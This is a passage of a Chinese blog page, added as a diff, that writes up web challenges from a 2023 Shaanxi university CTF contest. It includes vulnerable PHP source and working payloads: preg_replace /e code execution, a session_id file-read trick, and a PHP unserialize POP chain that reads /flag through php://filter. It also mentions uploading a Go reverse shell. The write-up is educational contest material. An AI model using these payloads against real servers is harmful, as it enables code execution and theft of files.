@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="2023年 第三届陕西省大学生网络安全技能大赛 web复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023年 第三届陕西省大学生网络安全技能大赛">
+<meta property="og:url" content="http://example.com/post/96d146ad.html">
+<meta property="og:site_name" content="Z1d10tのBlog">
+<meta property="og:description" content="2023年 第三届陕西省大学生网络安全技能大赛 web复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685798284302-dc2c0ac8-5db9-4eb6-95f8-f566951d3782.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685799018101-fb2d644a-0735-4333-b4da-4e64b2a493b1.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803106675-e16d229d-5e6d-40d0-9653-7cf198352d91.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803232225-93d4798a-5be8-4d62-a11b-e8aac6f367da.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685805828849-a21b53f3-1ce1-41c7-a71d-3c0796298211.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062254676-b77d0ea0-ca69-4769-914c-58379f6e7b6b.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062510940-7c390b3f-68a7-411f-94c4-5d22536f7537.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686063064061-e8f63abe-d04f-4cec-bd58-a675810b402e.png">
+<meta property="article:published_time" content="2023-06-06T16:01:00.000Z">
+<meta property="article:modified_time" content="2023-06-06T16:02:41.189Z">
+<meta property="article:author" content="Z1d10t">
+<meta property="article:tag" content="pop链">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685798284302-dc2c0ac8-5db9-4eb6-95f8-f566951d3782.png">
+
+
+<link rel="canonical" href="http://example.com/post/96d146ad.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/post/96d146ad.html","path":"post/96d146ad.html","title":"2023年 第三届陕西省大学生网络安全技能大赛"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023年 第三届陕西省大学生网络安全技能大赛 | Z1d10tのBlog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Z1d10tのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> </p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于博主</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezrce"><span class="nav-number">2.1.</span> <span class="nav-text">ezrce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezpop"><span class="nav-number">2.2.</span> <span class="nav-text">ezpop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#test"><span class="nav-number">2.3.</span> <span class="nav-text">test</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unserialize"><span class="nav-number">2.4.</span> <span class="nav-text">unserialize</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">2.4.1.</span> <span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F"><span class="nav-number">2.4.2.</span> <span class="nav-text">预期</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Esc4pe-T0-Mong0"><span class="nav-number">2.5.</span> <span class="nav-text">Esc4pe_T0_Mong0</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">3.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%A1%E9%81%93"><span class="nav-number">3.1.</span> <span class="nav-text">管道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E6%98%AF%E9%9B%AA%E5%95%8A%E9%A3%98%E8%BF%9B%E5%8F%8C%E7%9C%BC"><span class="nav-number">3.2.</span> <span class="nav-text">可是雪啊飘进双眼</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z1d10t"
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+  <p class="site-author-name" itemprop="name">Z1d10t</p>
+  <div class="site-description" itemprop="description">welcome to my blog (*^_^*)</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/96d146ad.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10tのBlog">
+      <meta itemprop="description" content="welcome to my blog (*^_^*)">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023年 第三届陕西省大学生网络安全技能大赛 | Z1d10tのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023年 第三届陕西省大学生网络安全技能大赛
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-06-07 00:01:00 / 修改时间：00:02:41" itemprop="dateCreated datePublished" datetime="2023-06-07T00:01:00+08:00">2023-06-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/" itemprop="url" rel="index"><span itemprop="name">各赛事WP</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>2023年 第三届陕西省大学生网络安全技能大赛 web复现</p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次反应出我的缺点：</p>
+<ol>
+<li>不够细心，ezpop进去后没有源码 以为是上neepu一样的源码泄露，没成功，然后扫了后台，一顿瞎操作，看了WP才发现是js中有一段base64，妈的，我真是纯出生，不够认真已经是老毛病了。</li>
+<li>找到答案了没有能够仔细照payload进行 那个反序列化修改私有属性考反射的题目 我tm已经payload写的和答案几乎一样了，细节可能有问题，但是当时做题不知道为啥还是显示被waf 然后就放弃了 。。</li>
+</ol>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685798284302-dc2c0ac8-5db9-4eb6-95f8-f566951d3782.png" alt="img"></p>
+<p>妈的 这道题目真可惜</p>
+<p>3.老是想象着把题目想的很复杂很难，可能一些题目需要很扎实的基本功吧。</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p>这道题目一眼丁真 和buu那个套娃一样 主要考的就是无参RCE，比较友好。</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685799018101-fb2d644a-0735-4333-b4da-4e64b2a493b1.png" alt="img"></p>
+<p>代码如上 偷的 复现没环境 很难受</p>
+<p>自己写一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); <span class="comment">//没有这个就会乱码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你是谁啊哥们？把钥匙给我！！！！&lt;br/r&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$qaq</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;qaq&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$name</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你是&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;大人????&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$name1</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/hahaha/e&#x27;</span>,<span class="variable">$qaq</span>,<span class="variable">$name</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;骗我的吧，你明明是    &gt;&gt;&gt;&gt;小小&quot;</span>.<span class="variable">$name1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>preg_replace() /e</code>模式可以代码执行</p>
+<p>我的payload：<code>name=hahaha&amp;qaq=print_r(eval(array_pop(apache_request_headers())))</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache_request_headers()`代替`getallheaders()</span><br></pre></td></tr></table></figure>
+
+<p>然后next 之类的移动指针都被waf了 用<code>array_pop</code>bypass 也就是把数组中最后一个元素值弹出 我们bp抓包修改一下 其实还有其他移动指针的函数：<code>each()prev()以及current()</code>但是都是指向当前由请求头组成数组的第一个元素 也就是host 这个改了网页就没法正常访问了 所以只能通过<code>array_pop()</code>把最后一个修改了 记得当时是<code>X-Real-Ip</code></p>
+<p>看了大佬的WP 还有一种是参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/9360</a> 通过<code>session_id()</code>来做的</p>
+<p>paylaod:<code>name=hahaha&amp;qaq=show_source(session_id(session_start()));</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803106675-e16d229d-5e6d-40d0-9653-7cf198352d91.png" alt="img"></p>
+<p>然后抓包 <code>Cookie: session_id=/flag</code>即可</p>
+<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>这个题进去没源码 以为是当时那个PHP &lt;= 7.4.21远程源码泄露漏洞 <a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a></p>
+<p>试了 无果 最后发现他js中藏了一段base64 我眼瞎</p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;night . <span class="string">&#x27;哒咩哟&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$day</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">go</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">light</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;light-&gt;<span class="title function_ invoke__">d</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dark</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;dark)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="title function_ invoke__">hacked</span>(<span class="variable">$this</span>-&gt;dark));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hacked</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="number">0</span>,<span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;呆jio步&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\.\.*/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$s</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$un</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); <span class="comment">//</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;seino&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>链子如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$day</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">light</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$light</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dark</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">night</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night = <span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night -&gt; day = <span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night -&gt; day -&gt; dark = <span class="keyword">new</span> <span class="title function_ invoke__">light</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night -&gt; day -&gt; dark -&gt; light = <span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night -&gt; day -&gt; dark -&gt; light -&gt; day = <span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night -&gt; day -&gt; dark -&gt; light -&gt; day -&gt; dark = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/flag&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的点就是这里会过滤/flag 的第一个<code>/</code>直接用伪协议读就可以了</p>
+<p>其次就是<code>throw new Exception(&#39;seino&#39;);</code>阻止我们的链子 其实考点就是fast destrcut</p>
+<p>随便破坏链子的结构可以了 之前见过</p>
+<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>进去是一个登录框 可以注册 然后登录 然后就会显示 <code>hello 登录名</code>看到这里谁不会想到是ssti呢 但是这是一个幌子 然后在登陆页面看源码可以发现    <code>/profile/index</code> 啥也没有 当然如果真没用 他也不会特意设置 唉 我真是猪脑 然后可以访问<code>/profile/admin</code>获得 admin的密码 </p>
+<p>进去之后 看了大佬的wp 提示帮我们运行go文件</p>
+<p>然后手写一个上传框 我这里还没学 </p>
+<p>然后上传go的反弹shell文件  就可以了 真的tql</p>
+<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>这道题目很可惜 应该是出了的 通过反射来修改类的的私有属性</p>
+<p>源码如下;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getFlag</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password==<span 